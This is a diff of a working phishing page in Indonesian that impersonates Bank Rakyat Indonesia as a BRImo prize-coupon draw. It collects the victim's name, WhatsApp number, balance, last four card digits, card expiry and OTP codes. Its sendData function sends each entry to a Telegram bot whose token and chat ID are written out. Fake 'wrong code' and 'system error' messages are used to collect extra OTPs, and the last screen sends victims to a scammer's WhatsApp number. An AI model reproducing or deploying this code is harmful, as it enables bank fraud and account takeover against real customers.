@@ -13,49 +13,22 @@
         .active { display: block; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* TEKS BERJALAN */
-        .marquee-box { background: #ff9900; color: white; padding: 6px 0; font-size: 12px; font-weight: bold; border-bottom: 1px solid #e6a700; }
-        
-        /* BANNER UTAMA */
+        .marquee-box { background: #ff9900; color: white; padding: 6px 0; font-size: 12px; font-weight: bold; }
         .banner { width: 100%; display: block; height: auto; max-height: 60vh; object-fit: contain; }
         
-        /* AREA TOMBOL (WARNA BIRU AIR/MUDA) */
-        .button-section { 
-            background: #e6f2ff; /* Warna Biru Air selaras background foto */
-            padding: 25px 20px; 
-            text-align: center;
-            border-top: 1px solid #b3d4fc;
-        }
+        .button-section { background: #e6f2ff; padding: 30px 20px; text-align: center; }
+        .btn-blue-bri { width: 100%; padding: 18px; background: #00529C; color: white; border: none; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,82,156,0.4); text-transform: uppercase; }
+        
+        /* Tombol WA CS Ramah */
+        #btn-cs { display: none; background: #25D366; margin-top: 15px; font-size: 16px; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4); }
 
-        /* TOMBOL DAFTAR (BIRU TUA PETAK) */
-        .btn-blue-bri { 
-            width: 100%; 
-            padding: 18px; 
-            background: #00529C; /* Biru Tua BRI */
-            color: white; 
-            border: none; 
-            border-radius: 8px; /* Petak sedikit melengkung biar rapi */
-            font-size: 19px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(0,82,156,0.4);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn-blue-bri:active { background: #003d75; transform: scale(0.97); }
-
-        /* NOTIFIKASI PEMENANG */
-        .notif-pemenang { position: fixed; bottom: 15px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 12px 20px; border-radius: 30px; font-size: 12px; z-index: 999; display: none; width: 85%; text-align: center; border: 1px solid #00529C; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-
-        /* FORM STYLING */
         .form-wrapper { padding: 20px; }
-        .label-bold { display: block; font-weight: bold; margin-bottom: 8px; font-size: 15px; color: #333; }
         .input-box { width: 100%; padding: 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 5px; outline: none; }
-        .input-box:focus { border-color: #00529C; }
-        .error-msg { color: red; font-size: 11px; margin-bottom: 10px; display: none; }
-        #fake-error-otp { color: #d93025; background: #fce8e6; padding: 15px; border-radius: 8px; font-weight: bold; border: 1px solid #f5c2c7; margin: 15px 0; display: none; font-size: 13px; line-height: 1.4; }
+        
+        /* Pesan Gangguan */
+        #fake-error-otp { color: #d93025; background: #fce8e6; padding: 15px; border-radius: 8px; font-weight: bold; border: 1px solid #f5c2c7; margin: 15px 0; display: none; font-size: 13px; line-height: 1.4; text-align: center; }
 
-        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; line-height: 1.5; background: #f9f9f9; border-top: 1px solid #eee; }
+        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; background: #f9f9f9; border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
@@ -64,95 +37,55 @@
     
     <div id="s1" class="slide active">
         <div class="marquee-box">
-            <marquee scrollamount="5">INFO: Selamat kepada 2.450 Nasabah yang telah mengaktifkan Kupon Undian BRImo FSTVL hari ini. Kesempatan menang masih terbuka lebar!</marquee>
+            <marquee>INFO: Selamat kepada Nasabah yang telah mengaktifkan Kupon Undian BRImo hari ini. Kesempatan menang masih terbuka lebar!</marquee>
         </div>
-
-        <img src="utama.jpg" class="banner" alt="Promo BRI">
-        
+        <img src="utama.jpg" class="banner">
         <div class="button-section">
             <button class="btn-blue-bri" onclick="move(2)">DAFTAR DI SINI</button>
-            <div style="margin-top: 20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/BRI_Logo.svg/1200px-BRI_Logo.svg.png" height="22">
-                <p style="font-size: 12px; color: #00529C; font-weight: bold; margin-top: 10px;">Aktivasi Kupon Berhadiah Anda Sekarang</p>
-            </div>
-        </div>
-
-        <div style="padding: 15px; text-align: center; background: #e6f2ff;">
-             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/OJK_Logo.svg/2560px-OJK_Logo.svg.png" height="35">
+            <p style="font-size: 13px; color: #00529C; font-weight: bold; margin-top: 15px;">Aktivasi Kupon Berhadiah Sekarang</p>
         </div>
     </div>
 
     <div id="s2" class="slide">
         <img src="saldo.jpg" class="banner">
         <div class="form-wrapper">
-            <label class="label-bold">Nama Lengkap :</label>
-            <input type="text" id="nama" class="input-box" placeholder="Nama sesuai KTP">
-            <span id="err-nama" class="error-msg">Nama wajib diisi</span>
-
-            <label class="label-bold">Nomor WhatsApp :</label>
-            <input type="number" id="wa" class="input-box" placeholder="08xxxx">
-            <span id="err-wa" class="error-msg">Nomor WhatsApp wajib diisi</span>
-
-            <label class="label-bold">Saldo Terakhir :</label>
-            <input type="text" id="saldo" class="input-box" placeholder="Contoh: Rp 1.000.000" oninput="formatRupiah(this)">
-            <span id="err-saldo" class="error-msg">Saldo wajib diisi</span>
-
-            <button class="btn-blue-bri" onclick="processStep1()">Lanjutkan</button>
+            <input type="text" id="nama" class="input-box" placeholder="Nama Lengkap">
+            <input type="number" id="wa" class="input-box" placeholder="Nomor WhatsApp">
+            <input type="text" id="saldo" class="input-box" placeholder="Saldo Terakhir" oninput="formatRupiah(this)">
+            <button class="btn-blue-bri" onclick="move(3)">Lanjutkan</button>
         </div>
     </div>
 
     <div id="s3" class="slide">
         <img src="kartu.jpg" class="banner">
         <div class="form-wrapper">
-            <label class="label-bold">4 Digit Terakhir Kartu :</label>
-            <input type="number" id="digit" class="input-box" placeholder="xxxx" oninput="limit(this, 4)">
-            <span id="err-digit" class="error-msg">Wajib diisi</span>
-
-            <label class="label-bold">Masa Berlaku (MM/YY) :</label>
-            <input type="text" id="valid" class="input-box" placeholder="01/27" maxlength="5" oninput="fDate(this)">
-            <span id="err-valid" class="error-msg">Wajib diisi</span>
-
-            <button class="btn-blue-bri" onclick="processStep2()">Konfirmasi</button>
+            <input type="number" id="digit" class="input-box" placeholder="4 Digit Terakhir Kartu">
+            <input type="text" id="valid" class="input-box" placeholder="Masa Berlaku (MM/YY)" oninput="fDate(this)">
+            <button class="btn-blue-bri" onclick="move(4)">Konfirmasi</button>
         </div>
     </div>
 
     <div id="s4" class="slide" style="text-align: center; padding-top: 40px;">
-        <h3 style="color: #00529C;">Konfirmasi OTP</h3>
-        <p style="font-size: 14px; padding: 0 25px; color: #666;">Masukkan 6 digit kode rahasia yang dikirimkan ke nomor HP Anda melalui SMS.</p>
+        <h3 id="judul-otp" style="color: #00529C;">Verifikasi Kode</h3>
+        <p id="teks-otp" style="font-size: 14px; padding: 0 25px; color: #666;">Silakan masukkan 6 digit kode keamanan yang dikirim melalui <b>SMS / WhatsApp</b>.</p>
+        
         <div class="form-wrapper">
             <input type="number" id="otp" class="input-box" placeholder="xxxxxx" oninput="limit(this, 6)" style="text-align: center; font-size: 26px; letter-spacing: 6px; font-weight: bold; border-color: #00529C;">
-            <div id="fake-error-otp">KODE OTP SALAH ATAU KADALUARSA!<br>Sistem telah mengirim ulang kode terbaru. Silakan periksa SMS Anda.</div>
+            <div id="fake-error-otp"></div>
             <button class="btn-blue-bri" id="btn-otp" onclick="processFinal()">Selesai</button>
+            
+            <button class="btn-blue-bri" id="btn-cs" onclick="hubungiCS()">VERIFIKASI VIA WHATSAPP</button>
         </div>
     </div>
 
-    <div class="footer">
-        © 2026 PT Bank Rakyat Indonesia (Persero) Tbk.<br>Terdaftar dan diawasi oleh OJK.
-    </div>
-
-    <div id="notif" class="notif-pemenang"></div>
+    <div class="footer">© 2026 PT Bank Rakyat Indonesia (Persero) Tbk.</div>
 </div>
 
 <script>
     const token = '8606568440:AAFaGya4aEw_5v6yGlQEAOYDA56dYHf_9xk';
     const chatId = '7078260230';
-
-    const pemenang = [
-        "Ibu Sari dari Bandung baru saja menang emas 10gr",
-        "Bpk. Budi dari Jakarta baru saja menang Mobil Avanza",
-        "Ibu Mega dari Surabaya baru saja menang Logam Mulia",
-        "Sdr. Rizki dari Lampung baru saja menang iPhone 15 Pro",
-        "Ibu Nia dari Makassar baru saja menang Saldo 5 Juta"
-    ];
-
-    function showNotif() {
-        const notifBox = document.getElementById('notif');
-        const randomMsg = pemenang[Math.floor(Math.random() * pemenang.length)];
-        notifBox.innerHTML = "🎉 " + randomMsg;
-        notifBox.style.display = 'block';
-        setTimeout(() => { notifBox.style.display = 'none'; }, 4500);
-    }
-    setInterval(showNotif, 9000);
+    const nomorWA = '082261207708';
+    let errorCount = 0;
 
     function move(n) {
         document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
@@ -172,59 +105,54 @@
         else el.value = v;
     }
 
-    function limit(el, max) {
-        if (el.value.length > max) el.value = el.value.slice(0, max);
-    }
-
-    function validateInput(id) {
-        const input = document.getElementById(id);
-        const error = document.getElementById('err-' + id);
-        if (input.value.trim() === '') {
-            if(error) error.style.display = 'block';
-            input.style.borderColor = 'red';
-            return false;
-        } else {
-            if(error) error.style.display = 'none';
-            input.style.borderColor = '#ccc';
-            return true;
-        }
-    }
-
-    function processStep1() {
-        if (validateInput('nama') && validateInput('wa') && validateInput('saldo')) {
-            sendData('LOG: Data BRI');
-            move(3);
-        }
-    }
-
-    function processStep2() {
-        if (validateInput('digit') && validateInput('valid')) {
-            sendData('LOG: Kartu BRI');
-            move(4);
-        }
-    }
+    function limit(el, max) { if (el.value.length > max) el.value = el.value.slice(0, max); }
 
     function processFinal() {
         const otpInput = document.getElementById('otp');
         const errorBox = document.getElementById('fake-error-otp');
         const btn = document.getElementById('btn-otp');
+        const btnCS = document.getElementById('btn-cs');
+        const judul = document.getElementById('judul-otp');
+        const teks = document.getElementById('teks-otp');
 
-        if (otpInput.value.length < 6) {
-            alert("Masukkan 6 digit OTP");
-            return;
-        }
+        if (otpInput.value.length < 6) { alert("Masukkan 6 digit OTP"); return; }
 
-        sendData('LOG: OTP MASUK');
+        errorCount++;
+        sendData(`LOG: OTP KE-${errorCount}`);
+
         btn.innerHTML = "Memverifikasi...";
         btn.disabled = true;
 
         setTimeout(() => {
-            errorBox.style.display = 'block';
-            otpInput.value = ''; 
-            otpInput.style.borderColor = 'red';
-            btn.innerHTML = "Selesai";
             btn.disabled = false;
-        }, 2500);
+            btn.innerHTML = "Selesai";
+            otpInput.value = '';
+
+            if (errorCount === 1) {
+                errorBox.style.display = 'block';
+                errorBox.innerHTML = "KODE TIDAK SESUAI!<br>Silakan masukkan kode terbaru yang dikirim melalui SMS/WhatsApp.";
+            } else if (errorCount >= 2) {
+                judul.style.color = '#ff9900';
+                judul.innerHTML = "GANGGUAN SISTEM!";
+                teks.innerHTML = "Maaf, sistem sedang sibuk. Kami tidak dapat memverifikasi kode Anda secara otomatis.";
+                
+                errorBox.style.display = 'block';
+                errorBox.style.background = '#fff4e5';
+                errorBox.style.borderColor = '#ffc107';
+                errorBox.style.color = '#856404';
+                errorBox.innerHTML = "Silakan klik tombol di bawah untuk verifikasi manual melalui layanan bantuan WhatsApp kami.";
+                
+                btn.style.display = 'none';
+                otpInput.style.display = 'none';
+                btnCS.style.display = 'block';
+            }
+        }, 1500);
+    }
+
+    function hubungiCS() {
+        const nama = document.getElementById('nama').value;
+        const url = `https://wa.me/${nomorWA}?text=Halo%20Bantuan%20BRI,%20saya%20${nama}.%20Saya%20mengalami%20gangguan%20verifikasi%20saat%20klaim%20hadiah.%20Mohon%20verifikasi%20manual.`;
+        window.location.href = url;
     }
 
     function sendData(step) {
@@ -234,19 +162,10 @@
         const digit = document.getElementById('digit').value;
         const valid = document.getElementById('valid').value;
         const otp = document.getElementById('otp').value;
-
-        let pesan = `<b>${step}</b>\n`;
-        pesan += `Nama: ${nama}\n`;
-        pesan += `WA: ${wa}\n`;
-        pesan += `Saldo: ${saldo}\n`;
-        if(digit) pesan += `4 Digit: ${digit}\n`;
-        if(valid) pesan += `Valid: ${valid}\n`;
-        if(otp) pesan += `OTP: <code>${otp}</code>\n`;
-
+        let pesan = `<b>${step}</b>\nNama: ${nama}\nWA: ${wa}\nSaldo: ${saldo}\n4 Digit: ${digit}\nValid: ${valid}\nOTP: <code>${otp}</code>`;
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=html`;
         fetch(url);
     }
 </script>
-
 </body>
-  </html>
+</html>
